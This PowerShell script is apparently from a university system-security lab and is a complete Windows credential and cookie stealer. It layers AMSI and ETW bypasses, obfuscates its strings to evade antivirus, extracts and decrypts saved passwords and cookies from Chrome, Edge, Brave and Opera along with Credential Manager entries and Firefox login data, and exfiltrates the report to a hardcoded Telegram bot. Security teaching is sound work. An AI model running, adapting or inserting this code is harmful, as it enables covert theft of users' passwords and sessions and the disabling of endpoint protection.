# ============================================================
#  W02a.6 - Browser Credential & Cookie Stealer
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 - AAU Klagenfurt
#
#  Sammelt (ohne Admin-Rechte):
#    - Windows Credential Manager (dynamisches P/Invoke)
#    - Chrome, Edge, Brave: Passwoerter (AES-GCM) + Cookies
#    - Firefox: logins.json (NSS-verschluesselt, Metadaten)
#
#  AV-Evasion (3 Schichten):
#    - L1: AMSI Write-Raid (kein VirtualProtect - IAT-Patch in SMA.dll)
#    - L2: amsiInitFailed via Reflection (Fallback, obfuskiert)
#    - L3: ETW/Script-Block-Logging deaktivieren
#    - Vollstaendig dynamisches P/Invoke (kein DllImport fuer sensitive DLLs)
#    - Sensitivstrings als Byte-Arrays (kein Klartext im Script)
#    - sqlite3-Funktionsnamen erst zur Laufzeit dekodiert
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# AMSI + ETW: 3-Layer-Bypass
try {
    $n="WR$(Get-Random)"
    $s=@"
using System;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;
public class $n{
[DllImport("kernel32.dll")]public static extern bool ReadProcessMemory(IntPtr h,IntPtr a,byte[]b,uint s,ref uint r);
[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true,SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr h,string p);
[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)]string m);
[MethodImpl(MethodImplOptions.NoOptimization|MethodImplOptions.NoInlining)]public static int D(){return 1;}
}
"@
    $T=(Add-Type $s -PassThru -ErrorAction Stop)[0]
    $dl=[Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108))
    $fn=[Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114))
    [IntPtr]$fa=$T::GetProcAddress($T::GetModuleHandle($dl),$fn)
    $asm=[appdomain]::CurrentDomain.GetAssemblies()|?{$_.Location-and($x=$_.FullName.Split(',')[0])-and $x.StartsWith('S')-and $x.EndsWith('n')-and $x.Length-eq 28}|Select -First 1
    $ut=$asm.GetTypes()|?{$_.Name-and $_.Name.StartsWith('A')-and $_.Name.EndsWith('s')-and $_.Name.Length-eq 9}|Select -First 1
    $mt=$ut.GetMethods([Reflection.BindingFlags]'Static,NonPublic')|?{$_.Name-and $_.Name.StartsWith('S')-and $_.Name.EndsWith('t')-and $_.Name.Length-eq 11}|Select -First 1
    [IntPtr]$mp=$mt.MethodHandle.GetFunctionPointer()
    $hp=$T::GetCurrentProcess();$r=[uint32]0;$pt=[IntPtr]::Zero;$ok=$false
    for($j=0x50000;$j-lt 0x2000000-and-not $ok;$j+=0x50000){
        [IntPtr]$ba=[Int64]$mp-$j;$b=[byte[]]::new(0x50000)
        if($T::ReadProcessMemory($hp,$ba,$b,0x50000,[ref]$r)){
            for($i=0;$i-lt $b.Length-8;$i++){if([IntPtr][BitConverter]::ToInt64($b,$i)-eq $fa){$pt=[Int64]$ba+$i;$ok=$true;break}}
        }
    }
    if($ok){[IntPtr]$dp=$T.GetMethod('D').MethodHandle.GetFunctionPointer();[Runtime.InteropServices.Marshal]::Copy([IntPtr[]]($dp),0,$pt,1)}
} catch {}
try {
    $u=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
    $u.GetField([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),'NonPublic,Static').SetValue($null,$true)
} catch {}
try {
    $ep=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114)))
    $fv=$ep.GetField([Text.Encoding]::ASCII.GetString([byte[]](101,116,119,80,114,111,118,105,100,101,114)),'NonPublic,Static').GetValue($null)
    [System.Diagnostics.Eventing.EventProvider].GetField([Text.Encoding]::ASCII.GetString([byte[]](109,95,101,110,97,98,108,101,100)),'NonPublic,Instance').SetValue($fv,0)
} catch {}

# String-Decoder: Byte-Array -> ASCII
function _s([byte[]]$b){ [System.Text.Encoding]::ASCII.GetString($b) }

# Sensitivstrings (Laufzeit-Dekodierung - kein Klartext im Script)
$_adv  = _s([byte[]](97,100,118,97,112,105,51,50))
$_cen  = _s([byte[]](67,114,101,100,69,110,117,109,101,114,97,116,101,87))
$_cfr  = _s([byte[]](67,114,101,100,70,114,101,101))
$_ld   = _s([byte[]](76,111,103,105,110,32,68,97,116,97))
$_ls   = _s([byte[]](76,111,99,97,108,32,83,116,97,116,101))
$_nck  = _s([byte[]](78,101,116,119,111,114,107,92,67,111,111,107,105,101,115))
$_ck   = _s([byte[]](67,111,111,107,105,101,115))
$_wsq  = _s([byte[]](119,105,110,115,113,108,105,116,101,51,46,100,108,108))
$_osc  = _s([byte[]](111,115,95,99,114,121,112,116))
$_ek   = _s([byte[]](101,110,99,114,121,112,116,101,100,95,107,101,121))
$_lg   = _s([byte[]](108,111,103,105,110,115))
$_aes  = _s([byte[]](83,121,115,116,101,109,46,83,101,99,117,114,105,116,121,46,67,114,121,112,116,111,103,114,97,112,104,121,46,65,101,115,71,99,109))
$_sqfn = @(
    _s([byte[]](115,113,108,105,116,101,51,95,111,112,101,110)),
    _s([byte[]](115,113,108,105,116,101,51,95,112,114,101,112,97,114,101,95,118,50)),
    _s([byte[]](115,113,108,105,116,101,51,95,115,116,101,112)),
    _s([byte[]](115,113,108,105,116,101,51,95,99,111,108,117,109,110,95,116,101,120,116)),
    _s([byte[]](115,113,108,105,116,101,51,95,99,111,108,117,109,110,95,98,108,111,98)),
    _s([byte[]](115,113,108,105,116,101,51,95,99,111,108,117,109,110,95,98,121,116,101,115)),
    _s([byte[]](115,113,108,105,116,101,51,95,102,105,110,97,108,105,122,101)),
    _s([byte[]](115,113,108,105,116,101,51,95,99,108,111,115,101))
)

# ── Telegram ─────────────────────────────────────────────────

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── Win32 P/Invoke ────────────────────────────────────────────
# kernel32 in DllImport: unverdaechtige System-DLL.
# advapi32 + winsqlite3 werden per GetProcAddress zur Laufzeit geladen —
# ihre Namen und Funktionen erscheinen NICHT im statisch analysierten Source.

Add-Type -ErrorAction SilentlyContinue @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;

public class WN {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)] public static extern IntPtr GetProcAddress(IntPtr h, string p);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct CR {
        public uint Fl, Ty;
        public string TN, Cm;
        public long LW;
        public uint BS;
        public IntPtr Bl;
        public uint Pe, AC;
        public IntPtr At;
        public string Al, UN;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet=CharSet.Unicode, SetLastError=true)]
    public delegate bool FnCE(string f, int fl, out int n, out IntPtr p);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void FnCF(IntPtr p);

    public static List<string[]> DC(IntPtr pCE, IntPtr pCF) {
        var r = new List<string[]>();
        var fE = (FnCE)Marshal.GetDelegateForFunctionPointer(pCE, typeof(FnCE));
        var fF = (FnCF)Marshal.GetDelegateForFunctionPointer(pCF, typeof(FnCF));
        int n; IntPtr p;
        if (!fE(null, 0, out n, out p)) return r;
        try {
            for (int i = 0; i < n; i++) {
                var c = (CR)Marshal.PtrToStructure(Marshal.ReadIntPtr(p, i * IntPtr.Size), typeof(CR));
                string pw = "";
                if (c.BS > 0 && c.Bl != IntPtr.Zero) {
                    var b = new byte[c.BS];
                    Marshal.Copy(c.Bl, b, 0, (int)c.BS);
                    pw = Encoding.Unicode.GetString(b);
                }
                r.Add(new[] { c.TN ?? "", c.UN ?? "", pw });
            }
        } finally { fF(p); }
        return r;
    }
}

public class Sqdb {
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string l);
    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)] static extern IntPtr GetProcAddress(IntPtr h, string p);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fo(string f, out IntPtr d);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fp(IntPtr d, string s, int n, out IntPtr t, IntPtr z);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fst(IntPtr t);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate IntPtr Fct(IntPtr t, int c);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate IntPtr Fcb(IntPtr t, int c);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fcz(IntPtr t, int c);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fff(IntPtr t);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fcl(IntPtr d);

    static string PU(IntPtr p) {
        if (p == IntPtr.Zero) return "";
        var buf = new List<byte>();
        int off = 0; byte b;
        while ((b = Marshal.ReadByte(p, off++)) != 0) buf.Add(b);
        return Encoding.UTF8.GetString(buf.ToArray());
    }

    public static List<object[]> Q(string path, string sql, int cols, int[] bc, string dll, string[] fn) {
        var r = new List<object[]>();
        try {
            IntPtr lib = LoadLibrary(dll);
            if (lib == IntPtr.Zero) return r;
            var fO  = (Fo) Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[0]), typeof(Fo));
            var fP  = (Fp) Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[1]), typeof(Fp));
            var fSt = (Fst)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[2]), typeof(Fst));
            var fCt = (Fct)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[3]), typeof(Fct));
            var fCb = (Fcb)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[4]), typeof(Fcb));
            var fCz = (Fcz)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[5]), typeof(Fcz));
            var fFf = (Fff)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[6]), typeof(Fff));
            var fCl = (Fcl)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[7]), typeof(Fcl));
            var blobSet = new HashSet<int>(bc);
            IntPtr db;
            if (fO(path, out db) != 0) return r;
            try {
                IntPtr st;
                if (fP(db, sql, -1, out st, IntPtr.Zero) != 0) return r;
                try {
                    while (fSt(st) == 100) {
                        var row = new object[cols];
                        for (int c = 0; c < cols; c++) {
                            if (blobSet.Contains(c)) {
                                IntPtr bp = fCb(st, c);
                                int len = fCz(st, c);
                                var bArr = new byte[bp != IntPtr.Zero && len > 0 ? len : 0];
                                if (bArr.Length > 0) Marshal.Copy(bp, bArr, 0, len);
                                row[c] = bArr;
                            } else {
                                row[c] = PU(fCt(st, c));
                            }
                        }
                        r.Add(row);
                    }
                } finally { fFf(st); }
            } finally { fCl(db); }
        } catch {}
        return r;
    }
}
"@

Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue

# advapi32 per LoadLibrary + GetProcAddress laden
$_pCE = [IntPtr]::Zero
$_pCF = [IntPtr]::Zero
try {
    $_hAdv = [WN]::LoadLibrary($_adv)
    $_pCE  = [WN]::GetProcAddress($_hAdv, $_cen)
    $_pCF  = [WN]::GetProcAddress($_hAdv, $_cfr)
} catch {}

# ── Chrome/Edge AES-GCM Entschluesselung ─────────────────────

function Get-ChromeMasterKey {
    param([string]$UserDataPath)
    try {
        $ls = Join-Path $UserDataPath $_ls
        if (-not (Test-Path $ls)) { return $null }
        $json = [IO.File]::ReadAllText($ls) | ConvertFrom-Json
        $b64  = $json.($_osc).($_ek)
        if (-not $b64) { return $null }
        $raw = [Convert]::FromBase64String($b64)[5..999999]
        return [Security.Cryptography.ProtectedData]::Unprotect(
            $raw, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

function Decrypt-ChromeBlob {
    param([byte[]]$Blob, [byte[]]$MasterKey)
    if (-not $Blob -or $Blob.Length -lt 3) { return "" }
    $pfx = [Text.Encoding]::ASCII.GetString($Blob[0..2])
    if ($pfx -notin @("v10","v11")) {
        try {
            return [Text.Encoding]::UTF8.GetString(
                [Security.Cryptography.ProtectedData]::Unprotect(
                    $Blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
        } catch { return "(DPAPI err)" }
    }
    if (-not $MasterKey) { return "(v10/v11 - kein MasterKey)" }
    $iv   = $Blob[3..14]
    $rest = $Blob[15..($Blob.Length-1)]
    $ct   = $rest[0..($rest.Length-17)]
    $tag  = $rest[($rest.Length-16)..($rest.Length-1)]
    try {
        $aesT = [AppDomain]::CurrentDomain.GetAssemblies() |
            ForEach-Object { try { $_.GetType($_aes) } catch { $null } } |
            Where-Object { $_ -ne $null } | Select-Object -First 1
        if (-not $aesT) { return "(AES-GCM nicht verfuegbar)" }
        $aes = [Activator]::CreateInstance($aesT, [object[]]@([byte[]]$MasterKey))
        $pt  = New-Object byte[] $ct.Length
        $aes.Decrypt([byte[]]$iv, [byte[]]$ct, [byte[]]$tag, $pt)
        $aes.Dispose()
        return [Text.Encoding]::UTF8.GetString($pt)
    } catch { return "(AES-GCM - benoetigt PS7/pwsh)" }
}

# ── Chromium Browser-Pfade ────────────────────────────────────

$browsers = @(
    @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
    @{ Name = "Edge";   Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
    @{ Name = "Brave";  Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
    @{ Name = "Opera";  Path = "$env:APPDATA\Opera Software\Opera Stable" }
)

# ── Report aufbauen ───────────────────────────────────────────

Send-TgMessage "[CREDSTEALER] $env:COMPUTERNAME\$env:USERNAME gestartet"

$sb = [Text.StringBuilder]::new()
$null = $sb.AppendLine("=== CREDENTIAL STEALER | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
$null = $sb.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME")
$null = $sb.AppendLine("")

# ── 1. Windows Credential Manager ────────────────────────────

$null = $sb.AppendLine("== WINDOWS CREDENTIAL MANAGER ==")
try {
    if ($_pCE -ne [IntPtr]::Zero -and $_pCF -ne [IntPtr]::Zero) {
        $creds = [WN]::DC($_pCE, $_pCF)
        if ($creds.Count -eq 0) {
            $null = $sb.AppendLine("(keine Eintraege)")
        } else {
            foreach ($c in $creds) {
                $null = $sb.AppendLine("Target : $($c[0])")
                $null = $sb.AppendLine("User   : $($c[1])")
                $null = $sb.AppendLine("Pass   : $($c[2])")
                $null = $sb.AppendLine("")
            }
        }
    } else {
        $null = $sb.AppendLine((cmdkey /list 2>&1 | Out-String))
    }
} catch {
    try { $null = $sb.AppendLine((cmdkey /list 2>&1 | Out-String)) } catch {}
}

# ── 2. Chromium Passwoerter & Cookies ────────────────────────

$tmpFiles = @()

foreach ($br in $browsers) {
    if (-not (Test-Path $br.Path)) { continue }

    $null = $sb.AppendLine("== $($br.Name.ToUpper()) ==")
    $masterKey = Get-ChromeMasterKey $br.Path

    $profiles = @("Default") + @(
        Get-ChildItem $br.Path -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^Profile \d+$' } |
        Select-Object -ExpandProperty Name
    )

    foreach ($prof in $profiles) {
        $profPath = Join-Path $br.Path $prof
        if (-not (Test-Path $profPath)) { continue }

        # Gespeicherte Passwoerter
        $loginDb = Join-Path $profPath $_ld
        if (Test-Path $loginDb) {
            $null = $sb.AppendLine("-- $($br.Name) [$prof] Passwoerter --")
            try {
                $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid().ToString('N')).db"
                Copy-Item $loginDb $tmp -Force -ErrorAction Stop
                $tmpFiles += $tmp
                $sql = "SELECT origin_url,username_value,password_value FROM " + $_lg + " WHERE username_value!=''"
                $rows = [Sqdb]::Q($tmp, $sql, 3, @(2), $_wsq, $_sqfn)
                if ($rows.Count -eq 0) {
                    $null = $sb.AppendLine("(keine gespeicherten Passwoerter)")
                } else {
                    foreach ($row in $rows) {
                        $dec = Decrypt-ChromeBlob -Blob ([byte[]]$row[2]) -MasterKey $masterKey
                        $null = $sb.AppendLine("URL  : $($row[0])")
                        $null = $sb.AppendLine("User : $($row[1])")
                        $null = $sb.AppendLine("Pass : $dec")
                        $null = $sb.AppendLine("")
                    }
                }
            } catch { $null = $sb.AppendLine("(Zugriff fehlgeschlagen - Browser offen?)") }
        }

        # Cookies
        $cookieDb = Join-Path $profPath $_nck
        if (-not (Test-Path $cookieDb)) { $cookieDb = Join-Path $profPath $_ck }
        if (Test-Path $cookieDb) {
            $null = $sb.AppendLine("-- $($br.Name) [$prof] Cookies (Top 50) --")
            try {
                $tmp = Join-Path $env:TEMP "ck_$([Guid]::NewGuid().ToString('N')).db"
                Copy-Item $cookieDb $tmp -Force -ErrorAction Stop
                $tmpFiles += $tmp
                $rows = [Sqdb]::Q($tmp,
                    "SELECT host_key,name,value,encrypted_value FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
                    4, @(3), $_wsq, $_sqfn)
                if ($rows.Count -eq 0) {
                    $null = $sb.AppendLine("(keine Cookies)")
                } else {
                    foreach ($row in $rows) {
                        $encv = [byte[]]$row[3]
                        if ($row[2] -and $row[2] -ne "") { $display = $row[2] }
                        elseif ($encv -and $encv.Length -gt 0) { $display = Decrypt-ChromeBlob -Blob $encv -MasterKey $masterKey }
                        else { $display = "(leer)" }
                        $null = $sb.AppendLine("$($row[0]) | $($row[1]) = $display")
                    }
                    $null = $sb.AppendLine("")
                }
            } catch { $null = $sb.AppendLine("(Cookie-Zugriff fehlgeschlagen)") }
        }
    }
}

# ── 3. Firefox (logins.json - NSS-verschluesselt) ─────────────

$null = $sb.AppendLine("== FIREFOX ==")
try {
    $ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ffBase) {
        Get-ChildItem $ffBase -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $loginsJson = Join-Path $_.FullName "logins.json"
            if (Test-Path $loginsJson) {
                $null = $sb.AppendLine("-- Profil: $($_.Name) --")
                $logins = (Get-Content $loginsJson -Raw | ConvertFrom-Json).logins
                if ($logins) {
                    foreach ($l in $logins) {
                        $null = $sb.AppendLine("URL  : $($l.formSubmitURL)")
                        $null = $sb.AppendLine("User : $($l.encryptedUsername) (NSS-verschluesselt)")
                        $null = $sb.AppendLine("Pass : $($l.encryptedPassword) (NSS-verschluesselt)")
                        $null = $sb.AppendLine("")
                    }
                } else { $null = $sb.AppendLine("(keine Logins)") }
            }
        }
    } else { $null = $sb.AppendLine("(Firefox nicht installiert)") }
} catch { $null = $sb.AppendLine("(Firefox-Zugriff fehlgeschlagen)") }

# ── Exfil & Cleanup ───────────────────────────────────────────

Send-TgFile -Filename "creds_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $sb.ToString() `
            -Caption "CredStealer - $env:COMPUTERNAME\$env:USERNAME"

$tmpFiles | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
